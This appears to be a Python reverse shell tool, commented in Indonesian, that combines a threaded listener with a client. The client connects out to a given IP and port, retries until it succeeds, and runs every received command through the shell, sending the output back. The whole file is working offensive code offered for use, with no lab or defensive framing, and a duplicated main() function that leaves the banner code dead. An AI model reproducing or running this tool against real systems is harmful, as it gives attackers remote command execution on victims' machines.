#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import argparse
import threading
import time

def main():
    # ASCII Art Banner
    banner = """
 ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
    """
    print(banner)

def list_local_ips():
    """Fungsi untuk mendapatkan dan menampilkan IP lokal yang tersedia."""
    try:
        host_name = socket.gethostname()
        local_ips = socket.gethostbyname_ex(host_name)[2]
    except Exception as e:
        print(f"[-] Gagal mengambil IP lokal: {e}")
        local_ips = []
    if local_ips:
        print("[+] IP address lokal yang tersedia:")
        for ip in local_ips:
            print(" -", ip)
    else:
        print("[-] Tidak ditemukan IP lokal.")
    return local_ips

def client_mode(server_ip, server_port):
    """Mode client: menghubungkan ke server dan mengeksekusi perintah secara reverse shell."""
    print("BANNER")
    print(f"[+] Mode Client: Menghubungkan ke {server_ip}:{server_port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((server_ip, server_port))
            print(f"[+] Terhubung ke {server_ip}:{server_port}")
            break
        except Exception as e:
            print(f"[-] Koneksi gagal: {e}. Mencoba lagi dalam 5 detik...")
            time.sleep(5)
    try:
        while True:
            command = s.recv(1024).decode()
            if not command:
                break
            command = command.strip()
            if command.lower() == 'exit':
                print("[*] Perintah exit diterima. Menutup koneksi.")
                break
            elif command.lower().startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    output = f"[+] Direktori berubah ke: {os.getcwd()}"
                except Exception as e:
                    output = f"[-] Error: {e}"
                s.send(output.encode())
            else:
                output = subprocess.getoutput(command)
                if not output:
                    output = "[No output]"
                s.send(output.encode())
    except KeyboardInterrupt:
        print("\n[*] Client dihentikan oleh pengguna.")
    finally:
        s.close()

def handle_client(client_socket, addr):
    """Handler untuk setiap koneksi client pada mode server."""
    print(f"\n[+] Koneksi diterima dari {addr[0]}:{addr[1]}")
    try:
        while True:
            command = input("Shell> ").strip()
            if not command:
                continue
            try:
                client_socket.send(command.encode())
            except Exception as e:
                print(f"[-] Gagal mengirim perintah: {e}")
                break
            if command.lower() == "exit":
                print("[*] Menutup koneksi dengan client.")
                break
            try:
                response = client_socket.recv(4096).decode()
                print(response)
            except Exception as e:
                print(f"[-] Gagal menerima response: {e}")
                break
    except KeyboardInterrupt:
        print("\n[*] Sesi dihentikan oleh pengguna.")
    finally:
        client_socket.close()

def server_mode(bind_ip, bind_port):
    """Mode server: listing IP lokal, binding, dan listening untuk koneksi reverse shell."""
    print("BANNER")
    print("[*] Mode Server: Listener Reverse Shell")
    local_ips = list_local_ips()
    # Jika bind_ip belum diberikan, minta input dari user
    if not bind_ip:
        bind_ip = input("Masukkan IP yang ingin digunakan untuk binding: ").strip()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((bind_ip, bind_port))
    except Exception as e:
        print(f"[-] Gagal bind ke {bind_ip}:{bind_port} -> {e}")
        sys.exit(1)
    server.listen(5)
    print(f"[+] Listening pada {bind_ip}:{bind_port} ...")
    print("[*] Tekan Ctrl+C untuk menghentikan listener.")
    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\n[*] Listener dihentikan oleh pengguna.")
    finally:
        server.close()

def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Tool - Combined Client and Server (Listing & Listening)"
    )
    parser.add_argument("mode", choices=["server", "client"], help="Pilih mode: 'server' untuk listener, 'client' untuk reverse shell client")
    parser.add_argument("--ip", help="IP address untuk binding (server) atau IP server (client)")
    parser.add_argument("--port", type=int, required=True, help="Port untuk binding atau koneksi")
    args = parser.parse_args()

    if args.mode == "server":
        server_mode(args.ip, args.port)
    elif args.mode == "client":
        if not args.ip:
            print("[-] Untuk mode client, IP server harus ditentukan dengan --ip")
            sys.exit(1)
        client_mode(args.ip, args.port)

if __name__ == "__main__":
    main()
